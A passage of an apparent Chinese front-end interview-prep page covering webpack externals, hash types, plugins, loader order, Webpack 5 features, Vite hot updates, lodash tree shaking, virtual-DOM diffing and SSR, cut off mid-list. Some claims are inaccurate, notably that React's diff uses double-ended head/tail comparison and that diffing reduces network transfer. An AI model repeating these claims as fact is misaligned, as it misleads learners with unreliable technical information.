<code>webpack.HotModuleReplacementPlugin</code>）以及一些开发服务器的配置（如 webpack-dev-server）。</p><h5 id="webpack中externl作用"><a href="#webpack中externl作用" class="headerlink" title="webpack中externl作用"></a>webpack中externl作用</h5><p>在 Webpack 中，<code>externals</code> 是一个配置选项，用于告诉 Webpack 哪些模块应该不被打包进输出的 bundle 文件中，而是在运行时从外部引入。这通常用于将一些库或模块作为外部依赖，在构建时不将它们包含到最终的输出文件中。这可以减小 bundle 文件的大小，加快加载速度，并且能够充分利用浏览器的缓存机制。</p><p><code>externals</code> 的基本作用如下：</p><ol><li><p><strong>避免重复打包：</strong> 如果你的项目依赖于一些第三方库（例如 jQuery、React、Vue 等），而这些库已经通过其他方式引入，例如通过 CDN 或在全局范围内加载，那么你可以使用 <code>externals</code> 将这些库排除在打包过程之外，避免重复打包它们。</p></li><li><p><strong>提供全局变量：</strong> 通过 <code>externals</code> 配置，你可以告诉 Webpack 这些库在全局作用域中可用，并且不需要被打包。这允许你在代码中直接引用这些库，而不需要使用 <code>import</code> 或 <code>require</code>。</p></li></ol><p>下面是一个示例，展示如何在 Webpack 中使用 <code>externals</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-comment">// ...</span><br>  <span class="hljs-attr">externals</span>: &#123;<br>    <span class="hljs-comment">// key 是你在代码中引用的模块名，value 是全局变量名</span><br>    <span class="hljs-attr">jquery</span>: <span class="hljs-string">&#x27;jQuery&#x27;</span>,<br>    <span class="hljs-attr">lodash</span>: <span class="hljs-string">&#x27;_&#x27;</span>,<br>  &#125;,<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>在上述示例中，我们告诉 Webpack 将 <code>jquery</code> 模块排除在打包之外，并将其视为全局变量 <code>jQuery</code>。这意味着在代码中可以直接使用 <code>$</code> 或 <code>jQuery</code> 变量，而不需要通过 <code>import</code> 或 <code>require</code> 引入。</p><p>注意事项：</p><ul><li>使用 <code>externals</code> 时，需要确保全局变量在项目中是可用的，通常通过在 HTML 文件中引入相应的 CDN 资源或其他方式来实现。</li><li>使用 <code>externals</code> 可能会增加一些配置复杂性，因为你需要确保模块名和全局变量名的映射是正确的。</li><li>对于一些复杂的模块，可能需要额外的配置，例如在打包时排除模块的某些部分。</li></ul><p>总之，<code>externals</code> 是一个用于管理外部依赖的重要配置选项，能够帮助你更灵活地处理项目中的模块引入和打包。</p><h5 id="webpack中hash-、-chunk-hash-、-content-hash区别"><a href="#webpack中hash-、-chunk-hash-、-content-hash区别" class="headerlink" title="webpack中hash 、 chunk hash 、 content hash区别"></a>webpack中hash 、 chunk hash 、 content hash区别</h5><p>在 Webpack 中，有三种不同的哈希（hash）类型，分别是 <code>hash</code>、<code>chunkhash</code> 和 <code>contenthash</code>，它们用于生成文件名或文件内容的唯一标识符，通常用于缓存控制和文件版本管理。以下是它们之间的区别：</p><ol><li><p><strong>hash：</strong></p><ul><li><code>hash</code> 是 Webpack 生成的每次构建的哈希值，它代表整个构建过程的内容，包括入口文件、模块代码、依赖等。</li><li>所有输出文件都会共享相同的 <code>hash</code>，这意味着如果任何一个文件发生了变化，所有的输出文件的哈希值都会改变。</li><li>适用于在开发阶段进行快速构建，但不适合生产环境，因为每次构建都会导致所有文件的哈希变化，使缓存失效。</li></ul></li><li><p><strong>chunk hash：</strong></p><ul><li><code>chunkhash</code> 是根据每个文件的内容生成的哈希值。每个入口文件和它所依赖的模块都有一个独立的 <code>chunkhash</code>。</li><li>当一个模块的内容发生变化时，只会影响到与该模块相关的输出文件的 <code>chunkhash</code>。</li><li>适用于生产环境，可以实现文件级别的缓存控制，只有发生实际更改的文件的哈希值会改变。</li></ul></li><li><p><strong>content hash：</strong></p><ul><li><code>contenthash</code> 是根据文件内容生成的哈希值，只有文件内容发生变化时，它的值才会改变。</li><li><code>contenthash</code> 通常用于处理 CSS 文件、图片文件等不会频繁变动的文件，以确保这些文件在内容不变的情况下能够保持相同的哈希值，从而实现缓存控制。</li><li>对于具有稳定内容的文件，使用 <code>contenthash</code> 是一种非常有效的缓存策略。</li></ul></li></ol><p>通常情况下，在生产环境中，建议使用 <code>chunkhash</code> 或 <code>contenthash</code> 来实现文件级别的缓存控制，以确保只有发生实际更改的文件才会导致哈希值的变化，从而减小浏览器缓存失效的风险。在开发阶段，可以使用 <code>hash</code> 来快速构建和调试，因为它会在每次构建中都生成新的哈希值。</p><h5 id="webpack和vite的对比"><a href="#webpack和vite的对比" class="headerlink" title="webpack和vite的对比"></a>webpack和vite的对比</h5><p>Webpack 和 Vite 都是前端开发构建工具，但它们有一些重要的区别，以下是它们的对比：</p><ol><li><p><strong>构建速度：</strong></p><ul><li>Webpack：Webpack 是一个强大的构建工具，但在大型项目中，由于需要构建整个应用，初始启动和热更新的速度相对较慢。</li><li>Vite：Vite 的独特之处在于其快速的开发体验。它利用 ES 模块的特性，将构建分解为按需构建，因此启动和热更新速度非常快。这使得在开发过程中能够快速预览和调试代码变化。</li></ul></li><li><p><strong>构建方式：</strong></p><ul><li>Webpack：Webpack 使用传统的“静态依赖分析”方式构建项目，将所有的模块打包成一个或多个 bundle 文件。这种方式适用于大型复杂的应用，但在开发过程中构建速度较慢。</li><li>Vite：Vite 使用“按需编译”的方式，只在需要时编译相关模块。它通过 ES 模块的引入来实现，因此在开发过程中只加载需要的模块，加快了构建速度。</li></ul></li><li><p><strong>开发体验：</strong></p><ul><li>Webpack：Webpack 提供了丰富的插件和加载器，可以处理各种不同的任务。但配置较为复杂，需要熟悉各种配置选项。</li><li>Vite：Vite 的配置更加简单和直观，无需繁琐的配置文件。它支持现代的开发工具如 Vue、React、TypeScript 等，并默认支持热更新。</li></ul></li><li><p><strong>生态系统：</strong></p><ul><li>Webpack：Webpack 有一个庞大的生态系统，有丰富的插件和加载器，适用于各种应用场景。</li><li>Vite：Vite 的生态系统相对较新，但也在不断增长。它默认支持 Vue，但对于其他框架也有插件支持。</li></ul></li><li><p><strong>适用场景：</strong></p><ul><li>Webpack：适用于大型、复杂的项目，需要丰富的插件和加载器，以及定制化的构建流程。</li><li>Vite：适用于快速原型开发、小到中型的项目，以及对开发体验要求较高的场景。</li></ul></li></ol><p>综上所述，Webpack 和 Vite 都是优秀的构建工具，选择哪一个取决于项目的需求和个人喜好。对于大型项目或需要更多定制化的项目，Webpack 仍然是一个强大的选择。而对于快速原型开发和对开发体验要求较高的项目，Vite 提供了更快的构建速度和更简单的配置。在实际项目中，有时也可以考虑两者结合使用，例如使用 Vite 作为开发环境，而将生产构建交给 Webpack 处理。</p><h5 id="vite的热更新是怎么实现的"><a href="#vite的热更新是怎么实现的" class="headerlink" title="vite的热更新是怎么实现的"></a>vite的热更新是怎么实现的</h5><p>Vite的热更新是通过其内置的开发服务器和ES模块的特性实现的。以下是Vite热更新的工作原理：</p><ol><li><p><strong>开发服务器：</strong> Vite使用内置的开发服务器来提供热更新功能。该服务器能够在开发过程中动态提供更新的代码，而无需完全重新加载整个页面。</p></li><li><p><strong>ES模块（ESM）：</strong> Vite利用了现代浏览器对ES模块的原生支持。在Vite项目中，所有的JavaScript模块都被当作ES模块处理。</p></li><li><p><strong>HMR（热模块替换）：</strong> Vite使用HMR技术来实现热更新。HMR允许在应用程序运行时替换、添加或删除模块，而无需重新加载整个页面。这意味着只有发生更改的模块会被替换，而不会影响其他部分。</p></li><li><p><strong>WebSocket通信：</strong> Vite的开发服务器使用WebSocket与浏览器建立实时连接，以便在发生更改时能够快速通知浏览器。</p></li><li><p><strong>依赖分析：</strong> Vite能够分析模块之间的依赖关系，当某个模块发生更改时，它能够确定哪些模块受到影响，并将这些模块的更新推送到浏览器。</p></li><li><p><strong>客户端更新：</strong> 当开发者保存文件时，Vite会重新构建受影响的模块，并将更新的模块代码发送到浏览器。浏览器收到更新后，会使用HMR机制将新模块替换为旧模块，从而实现实时更新。</p></li></ol><p>总的来说，Vite的热更新是通过结合ES模块、HMR技术和WebSocket通信来实现的。这种方式使得开发者能够在开发过程中实时看到代码变更的效果，极大地提高了开发效率。不需要重新加载整个应用程序，只需更新受影响的模块，这使得热更新非常快速。</p><h5 id="webpack的plngin是怎么实现插件化的机制的"><a href="#webpack的plngin是怎么实现插件化的机制的" class="headerlink" title="webpack的plngin是怎么实现插件化的机制的"></a>webpack的plngin是怎么实现插件化的机制的</h5><p>Webpack 插件的实现机制基于 Node.js 的模块化和事件驱动的特性，通过以下方式实现插件化的机制：</p><ol><li><p><strong>模块化：</strong> Webpack 插件是基于 Node.js 模块化的。每个插件通常是一个 Node.js 模块，可以通过 CommonJS 或 ES6 模块语法导出一个插件类或函数。</p></li><li><p><strong>事件驱动：</strong> Webpack 在构建过程中触发了一系列的事件，插件可以监听这些事件并在事件发生时执行自定义的逻辑。Webpack 插件系统基于事件驱动模式，允许插件在不同的构建阶段插入自己的处理逻辑。</p></li><li><p><strong>生命周期钩子：</strong> Webpack 定义了一系列的生命周期钩子，代表了构建过程中的不同阶段。插件可以通过订阅这些生命周期钩子来执行自己的任务。例如，<code>beforeCompile</code> 钩子表示编译前的事件，<code>emit</code> 钩子表示即将输出文件的事件。</p></li><li><p><strong>事件参数：</strong> Webpack 在触发事件时会传递一个事件参数对象，该对象包含了与当前事件相关的信息。插件可以通过这个参数对象获取有关构建过程的详细信息，例如输入文件、输出文件、模块等。</p></li><li><p><strong>Tapable：</strong> Webpack 使用 Tapable 这个库来实现插件系统。Tapable 提供了一套事件订阅和发布的机制，使插件可以订阅并响应不同的事件。</p></li></ol><p>下面是一个简单的示例，展示了如何创建一个简单的 Webpack 插件并监听构建阶段的事件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyWebpackPlugin</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options</span>) &#123;<br>    <span class="hljs-comment">// 插件配置选项可以在构造函数中接收</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> = options;<br>  &#125;<br><br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    <span class="hljs-comment">// 注册事件监听器，监听构建阶段的事件</span><br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">emit</span>.<span class="hljs-title function_">tapAsync</span>(<span class="hljs-string">&#x27;MyWebpackPlugin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">compilation, callback</span>) =&gt;</span> &#123;<br>      <span class="hljs-comment">// 在 emit 阶段执行自定义逻辑</span><br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;MyWebpackPlugin is running&#x27;</span>);<br>      <br>      <span class="hljs-comment">// 执行完逻辑后调用 callback 通知 Webpack 继续构建流程</span><br>      <span class="hljs-title function_">callback</span>();<br>    &#125;);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title class_">MyWebpackPlugin</span>;<br></code></pre></td></tr></table></figure><p>在上面的示例中，我们创建了一个名为 <code>MyWebpackPlugin</code> 的插件，它监听了 Webpack 的 <code>emit</code> 事件。当 <code>emit</code> 事件触发时，插件会执行自定义逻辑。这个示例展示了 Webpack 插件的基本结构和事件监听机制。</p><p>通过这些机制，Webpack 插件系统实现了插件化的机制，允许开发者编写自定义的插件来扩展和定制 Webpack 的构建行为。每个插件可以根据需要监听不同的事件，执行各种任务，从而实现了灵活的构建流程定制。</p><h5 id="webapck的插件里面有同步插件和异步插件，那你觉得这是如何保证插件的执行顺序而不影响你的主流程。"><a href="#webapck的插件里面有同步插件和异步插件，那你觉得这是如何保证插件的执行顺序而不影响你的主流程。" class="headerlink" title="webapck的插件里面有同步插件和异步插件，那你觉得这是如何保证插件的执行顺序而不影响你的主流程。"></a>webapck的插件里面有同步插件和异步插件，那你觉得这是如何保证插件的执行顺序而不影响你的主流程。</h5><p>在 Webpack 插件系统中，确保插件的执行顺序而不影响主流程可以通过 Webpack 插件的执行机制来实现。Webpack 插件的执行顺序主要受以下两个因素影响：</p><ol><li><p><strong>插件注册顺序：</strong> 插件的注册顺序会影响它们的执行顺序。通常情况下，Webpack 插件是按照注册的先后顺序执行的，即先注册的插件会先执行，后注册的插件会后执行。</p></li><li><p><strong>Webpack 执行流程：</strong> Webpack 有一个明确的构建流程，包括诸如初始化、编译、输出文件等阶段。插件可以根据这些阶段的生命周期钩子来执行操作。Webpack 的生命周期钩子允许插件在不同的构建阶段注册回调函数，以便在合适的时机执行。</p></li></ol><p>通过合理地注册插件并使用Webpack提供的生命周期钩子，可以实现对插件的执行顺序进行精确控制。以下是一些常见的插件控制执行顺序的方式：</p><ol><li><p><strong>注册顺序控制：</strong> 如果需要确保某个插件在另一个插件之前或之后执行，可以根据注册顺序进行控制。将需要在前执行的插件早于其他插件注册，将需要在后执行的插件晚于其他插件注册。</p></li><li><p><strong>生命周期钩子控制：</strong> Webpack 提供了多个生命周期钩子，如 <code>beforeCompile</code>、<code>emit</code>、<code>afterEmit</code> 等。插件可以根据这些生命周期钩子注册回调函数，以在不同的构建阶段执行操作。通过选择合适的生命周期钩子，可以实现对插件执行顺序的精细控制。</p></li><li><p><strong>异步操作：</strong> 对于某些需要异步执行的操作，可以使用异步操作，如Promise或回调函数，来确保在异步操作完成后再执行其他插件的逻辑。这可以避免异步操作的结果影响到其他插件的执行。</p></li></ol><p>需要注意的是，Webpack 插件系统默认按照注册顺序执行插件，但某些插件可能会在异步操作中执行一些任务，因此在处理异步插件时需要格外小心，确保异步操作完成后再执行下一个插件。</p><p>总之，通过合理注册插件、使用Webpack提供的生命周期钩子以及处理异步操作，可以确保插件在不影响主流程的情况下按照预期的顺序执行。这样可以更好地控制构建过程，并实现各种自定义的构建逻辑。</p><h5 id="webpack的loader这一块处理前端样式是多个loader，执行顺序是"><a href="#webpack的loader这一块处理前端样式是多个loader，执行顺序是" class="headerlink" title="webpack的loader这一块处理前端样式是多个loader，执行顺序是"></a>webpack的loader这一块处理前端样式是多个loader，执行顺序是</h5><p>在 Webpack 中，处理前端样式通常需要使用多个 Loader，例如处理 CSS、Sass、Less、PostCSS 等不同类型的样式文件。Loader 的执行顺序是从右到左（或从下到上，取决于配置文件中的顺序），也就是说，最右边（或最下面）的 Loader 最先执行，然后依次向左（或向上）执行。这种执行顺序允许你将不同的转换和处理逻辑组合在一起，以满足项目的需求。</p><p>以下是一个示例 Webpack 配置，展示了多个 Loader 的执行顺序：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">module</span>: &#123;<br>    <span class="hljs-attr">rules</span>: [<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.scss$/</span>, <span class="hljs-comment">// 匹配以 .scss 结尾的文件</span><br>        <span class="hljs-attr">use</span>: [<br>          <span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-comment">// 最后执行的 Loader，将 CSS 注入到页面中</span><br>          <span class="hljs-string">&#x27;css-loader&#x27;</span>,   <span class="hljs-comment">// 先执行的 Loader，用于解析 CSS 文件</span><br>          <span class="hljs-string">&#x27;sass-loader&#x27;</span>   <span class="hljs-comment">// 先执行的 Loader，用于编译 Sass 文件</span><br>        ]<br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.js$/</span>, <span class="hljs-comment">// 匹配以 .js 结尾的文件</span><br>        <span class="hljs-attr">use</span>: <span class="hljs-string">&#x27;babel-loader&#x27;</span> <span class="hljs-comment">// 使用 Babel 进行 JavaScript 代码转换</span><br>      &#125;<br>    ]<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在上述示例中，针对 <code>.scss</code> 文件的处理顺序是：</p><ol><li><code>sass-loader</code> 先执行，用于编译 Sass 文件成为 CSS。</li><li><code>css-loader</code> 接下来执行，用于解析 CSS 文件，处理 <code>@import</code> 和 <code>url()</code> 等语法。</li><li>最后是 <code>style-loader</code>，它将处理后的 CSS 注入到页面中。</li></ol><p>这种顺序确保了样式文件经过正确的处理和转换后再被应用到页面上。</p><p>需要注意的是，虽然 Loader 的执行顺序是从右到左（或从下到上），但在实际配置中也可以根据需求调整 Loader 的顺序，以满足不同的项目要求。因此，Loader 的执行顺序可以根据具体情况进行调整和定制。</p><h5 id="webpack做过哪些优化"><a href="#webpack做过哪些优化" class="headerlink" title="webpack做过哪些优化"></a>webpack做过哪些优化</h5><p>Webpack 是一个非常强大的模块打包器，它可以帮助开发者处理代码依赖、打包、压缩等任务。在使用 Webpack 的过程中，我们可以通过一些方法优化项目，提高性能和用户体验。以下是一些常见的 Webpack 优化方法：</p><ol><li>Tree shaking：通过此技术，Webpack 可以消除未使用的代码，从而减少最终包的大小。为了实现这一点，确保在 package.json 文件中设置 “sideEffects” 选项。</li><li>代码分割（Code Splitting）：将代码分割成不同的 chunks，从而实现按需加载和并行加载。这可以减少首次加载时间和浏览器解析时间。可以使用 SplitChunksPlugin 和动态 import() 实现代码分割。</li><li>懒加载（Lazy Loading）：懒加载是一种按需加载策略，只有在实际需要时才加载某些代码。这可以显著减少首屏加载时间。</li><li>使用缓存：通过设置 cache-loader、HardSourceWebpackPlugin 或其他缓存插件，可以利用缓存加快构建速度。</li><li>压缩代码：使用插件如 TerserPlugin（用于 JavaScript）和 MiniCssExtractPlugin（用于 CSS）对代码进行压缩，减少代码体积，提高加载速度。</li><li>使用 DLL：通过使用 DllPlugin 和 DllReferencePlugin，可以将第三方库与应用程序代码分离，从而减少构建时间。</li><li>配置 resolve.alias：通过配置 resolve.alias，可以缩短查找模块的路径，从而提高构建速度。</li><li>使用 Web Workers 或 Service Workers：通过将一些任务放在后台线程中处理，可以提高应用程序的性能。</li><li>提取 CSS：通过使用 MiniCssExtractPlugin，可以将 CSS 从 JS 中分离出来，提高加载性能。</li><li>使用 Loaders 和 Babel：通过配置不同的 loaders 和 Babel 插件，可以在构建过程中优化代码，例如转换 ES6 语法、移除 console.log 等。</li><li>配置性能提示：通过配置 performance.hints 和 performance.assetFilter，可以监控和优化构建产物的大小。</li><li>使用 Webpack Bundle Analyzer：通过这个插件，可以分析和可视化 Webpack 输出的文件，从而帮助发现潜在的优化点。</li></ol><p>这些是在使用 Webpack 时可以采取的一些优化方法。针对具体项目，可能还需要结合实际情况进行更多优化。</p><h5 id="Wepback5有哪些新特性？"><a href="#Wepback5有哪些新特性？" class="headerlink" title="Wepback5有哪些新特性？"></a>Wepback5有哪些新特性？</h5><ol><li>持久缓存：Webpack 5 引入了文件系统缓存，可以在多次构建之间持久存储中间结果。这可以显著提高重复构建的速度。</li><li>模块联邦（Module Federation）：这是一个允许多个独立构建共享代码的新特性。模块联邦可以在不牺牲性能的情况下实现微前端架构。</li><li>更好的 Tree Shaking：Webpack 5 改进了 Tree Shaking，可以更有效地移除无用代码。</li><li>默认支持 Content Hash：现在默认为输出文件名添加内容哈希，以实现长期缓存优化。</li><li>更小的运行时代码：Webpack 5 的运行时代码更小，有助于减小最终生成的包的大小。</li><li>改进的代码分割策略：Webpack 5 对 SplitChunksPlugin 的默认配置进行了优化，以更好地支持公共代码的提取。</li><li>移除了一些过时的特性：Webpack 5 移除了一些不推荐使用的特性，如 Node.js 的 polyfill。</li></ol><h3 id="3、lodash支持tree-shaking吗？为什么？tree-shaking原理？"><a href="#3、lodash支持tree-shaking吗？为什么？tree-shaking原理？" class="headerlink" title="3、lodash支持tree-shaking吗？为什么？tree-shaking原理？"></a>3、lodash支持tree-shaking吗？为什么？tree-shaking原理？</h3><p>lodash 在一定程度上支持 Tree Shaking，但不是完全支持。Tree Shaking 是一种 JavaScript 模块打包优化技术，它的目标是在构建过程中去除未使用的代码（未引用的模块或导出），以减小最终生成的包的大小。这使得只有实际用到的代码会被打包到最终的应用程序中，从而减小了文件大小，提高了性能。</p><p>在 lodash 中，每个函数都是一个单独的模块，这意味着您可以使用 Tree Shaking 来选择性地导入和使用 lodash 中的函数。例如，如果您只使用了 <code>lodash</code> 中的 <code>map</code> 函数，可以这样导入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; map &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;lodash&#x27;</span>;<br></code></pre></td></tr></table></figure><p>然后，通过 Tree Shaking，只有 <code>map</code> 函数会被包含在最终的构建输出中。</p><p>然而，lodash 也有一些部分不容易被 Tree Shaking 优化的地方，这主要是因为 lodash 中的一些功能是通过链式调用或运行时配置生成的，这些特性使得某些 lodash 模块难以被静态地分析和优化。例如，如果您使用了 lodash 的链式调用风格的 <code>_.chain</code> 方法，那么可能会导致整个 lodash 库被包含在构建输出中，即使只使用了其中的一部分功能。</p><p>Tree Shaking 的原理涉及到静态分析和依赖图的构建。通常，构建工具（例如 Webpack）会分析代码中的 import 和 export 语句，然后根据依赖关系确定哪些模块是未引用的，然后将这些未引用的模块从最终的构建输出中移除。这个过程要求模块系统和构建工具能够正确识别模块之间的依赖关系，并进行智能地剪裁未使用的代码。</p><p>总之，虽然 lodash 在一定程度上支持 Tree Shaking，但要注意一些链式调用等特性可能会导致一些未使用的代码被保留在构建输出中。因此，在使用 lodash 或其他库时，建议查看文档以了解如何最大程度地利用 Tree Shaking 进行代码优化。</p><h3 id="4、为什么Vue和React要有diff算法"><a href="#4、为什么Vue和React要有diff算法" class="headerlink" title="4、为什么Vue和React要有diff算法"></a>4、为什么Vue和React要有diff算法</h3><p>Vue和React都是流行的JavaScript库，用于构建用户界面。它们之所以需要有diff算法，是因为在实际开发中，页面的数据和状态经常会发生变化，为了高效地更新页面视图，需要有一种方法来比较新旧状态并计算出最小的更新操作。</p><p>以下是深入回答为什么Vue和React需要有diff算法的原因：</p><ol><li><p><strong>性能优化：</strong> 在一个动态的Web应用中，频繁地更新DOM元素是一项昂贵的操作。如果每次数据变化都重新渲染整个界面，会导致性能问题，因此需要一种方法来仅更新发生变化的部分，以提高性能。</p></li><li><p><strong>减少重绘和重排：</strong> 浏览器的渲染过程包括重排（Reflow）和重绘（Repaint）操作，它们都会消耗大量的计算资源。diff算法可以帮助减少这些操作的次数，从而减轻了浏览器的负担。</p></li><li><p><strong>减少网络传输：</strong> 在一些情况下，前端应用从服务器获取数据，如果可以仅传输发生变化的数据部分，可以减少网络带宽的使用。diff算法有助于确定哪些数据已经在客户端，哪些数据需要从服务器获取。</p></li><li><p><strong>提高用户体验：</strong> 页面快速响应是提高用户体验的关键因素之一。通过只更新必要的部分，可以确保用户界面保持流畅和快速的响应，不会因数据变化而出现卡顿或闪烁。</p></li><li><p><strong>节省内存：</strong> 如果每次数据变化都创建新的DOM元素，会导致内存占用不断增加。diff算法可以帮助重用已经存在的DOM元素，减少内存占用。</p></li><li><p><strong>提高开发效率：</strong> 在大型应用中，手动管理DOM更新是一项复杂的任务，容易出错。有了diff算法，开发人员可以更容易地编写高效的代码，而不必担心手动处理DOM操作。</p></li></ol><p>总之，Vue和React之所以需要有diff算法，是为了优化性能、减少资源消耗、提高用户体验和提高开发效率。这些库的diff算法可以智能地比较新旧状态，只更新必要的部分，以确保页面在数据变化时能够快速而高效地响应。这对于构建现代、高性能的Web应用至关重要。</p><h5 id="react的diff算法细节"><a href="#react的diff算法细节" class="headerlink" title="react的diff算法细节"></a>react的diff算法细节</h5><p>React 的 Virtual DOM（虚拟 DOM）和 Diff 算法是 React 性能优化的关键。以下是 React Diff 算法的一些关键细节：</p><ol><li><p><strong>虚拟 DOM：</strong> React 使用虚拟 DOM 表示真实 DOM 的树结构。当组件状态变化时，React 不会立即操作真实 DOM，而是先在内存中构建一个新的虚拟 DOM 树，然后将新旧虚拟 DOM 树进行比较。</p></li><li><p><strong>Diff 策略：</strong> React 的 Diff 算法采用了双端比较策略，即同时从新虚拟 DOM 树的头部和尾部开始比较，以找到最小更新路径。这可以减少比较次数，提高性能。</p></li><li><p><strong>Key 属性：</strong> React 鼓励每个列表项（如数组中的元素）添加一个唯一的 <code>key</code> 属性。这个 <code>key</code> 属性可以帮助 React 更精确地找到新旧虚拟 DOM 树中相对应的节点，从而避免不必要的更新。使用 <code>key</code> 可以有效地处理列表项的增删操作。</p></li><li><p><strong>三种操作：</strong> React 的 Diff 算法将节点更新分为三种操作：插入、更新和删除。当比较新旧虚拟 DOM 树时，算法会识别出哪些节点需要插入到真实 DOM 中、哪些节点需要更新、哪些节点需要删除。</p></li><li><p><strong>Diff 算法复杂度：</strong> 新旧虚拟DOM对比的时候，Diff算法比较只会在同层级进行, 不会跨层级比较。 所以Diff算法是:<code>深度优先算法</code>。 时间复杂度:<code>O(n)</code>，其中 n 表示虚拟 DOM 树中节点的数量。这意味着算法的性能是线性的，与节点数量成正比，因此可以高效地处理大型应用中的 DOM 更新。</p></li><li><p><strong>组件更新策略：</strong> React 通过组件的生命周期方法来决定何时进行组件的重新渲染。组件更新不一定会导致真实 DOM 的更新，React 会智能地选择何时进行虚拟 DOM 的比较和真实 DOM 的更新，以提高性能。</p></li></ol><p>总之，React 的 Diff 算法是一个高效的、基于虚拟 DOM 的算法，它通过智能的比较策略和 <code>key</code> 属性的利用，可以有效地减少不必要的 DOM 更新操作，提高应用的性能和响应速度。这使得 React 成为构建高性能、可维护的用户界面的强大工具。</p><h5 id="diff实现"><a href="#diff实现" class="headerlink" title="diff实现"></a>diff实现</h5><p>虚拟 DOM 和前端框架通常使用 diff 算法来比较两个虚拟 DOM 树（或树的节点），以确定需要进行的 DOM 更新操作，从而提高页面性能。下面是一种常见的 diff 算法的简要工作原理：</p><ol><li><p><strong>比较树的根节点</strong>：算法首先比较两个虚拟 DOM 树的根节点，以确定它们是否相同。如果根节点不同，则整个树被标记为需要替换，算法将创建新的实际 DOM 元素并替换旧的元素。</p></li><li><p><strong>递归比较子节点</strong>：如果两个根节点相同，算法会递归比较它们的子节点。这个递归过程会深入到虚拟 DOM 树的每个分支，并比较它们的节点。</p></li><li><p><strong>同级元素比较</strong>：在递归中，算法会比较同一级别的节点，确定它们是否相同。算法会尽早地检测到不同，从而避免深入比较不必要的子节点。</p></li><li><p><strong>更新策略</strong>：一旦发现两个节点不同，算法会采取不同的更新策略，具体取决于框架和应用程序的需求。常见的更新策略包括：</p><ul><li>替换节点：完全替换一个节点及其子节点。</li><li>更新节点：只更新节点的属性或文本内容，而不替换子节点。</li><li>移动节点：将一个节点从一个位置移动到另一个位置，而不创建新节点。</li><li>删除节点：从 DOM 中删除一个节点，或标记为需要删除。</li></ul></li><li><p><strong>最小化更新</strong>：diff 算法的目标是尽量减少 DOM 更新操作的数量。因此，它会尽量找到最小的一组操作来将虚拟 DOM 更新为实际 DOM，以提高性能。</p></li></ol><p>虽然上述是一种简要的描述，但实际的 diff 算法可能会更加复杂和优化，以应对不同的情况和性能需求。例如，React 中的 diff 算法（称为Reconciliation算法）会使用一些启发式策略来进一步优化更新过程，以减少不必要的比较和操作。</p><p>需要注意的是，虽然 diff 算法可以显著提高性能，但它并不是银弹，也需要开发者编写高效的应用程序代码，以最大程度地减少虚拟 DOM 树的变化。因此，在使用虚拟 DOM 和 diff 算法时，开发者仍然需要考虑应用程序的设计和数据流程，以确保性能的最佳表现。</p><h3 id="5、SSR了解吗"><a href="#5、SSR了解吗" class="headerlink" title="5、SSR了解吗"></a>5、SSR了解吗</h3><p>是的，我了解服务器端渲染（Server-Side Rendering，SSR）的概念和原理。服务器端渲染是一种将网页内容的生成和渲染工作从客户端转移到服务器端的Web开发技术。它与传统的客户端渲染（Client-Side Rendering，CSR）有一些重要的区别和优势。</p><p>以下是关于服务器端渲染的一些关键概念和特点：</p><ol><li><p><strong>页面首次加载更快：</strong> 在CSR中，浏览器需要下载HTML文件后再通过JavaScript动态渲染页面内容，因此页面的首次加载速度可能会较慢。而在SSR中，服务器会生成带有初始化数据的HTML，浏览器直接展示渲染好的页面，因此首次加载速度更快，用户能够更快地看到内容。</p></li><li><p><strong>SEO优势：</strong> 由于搜索引擎爬虫能够直接读取服务器渲染的HTML内容，SSR对搜索引擎优化（SEO）更友好。而CSR中，搜索引擎可能无法正确解析页面内容。</p></li><li><p><strong>更好的性能表现：</strong> 对于某些应用程序，SSR可以减轻客户端的负载，因为页面内容已经在服务器上渲染完成，而不是依赖客户端设备来完成渲染工作。</p></li><li><p><strong>不适用于所有场景：</strong> 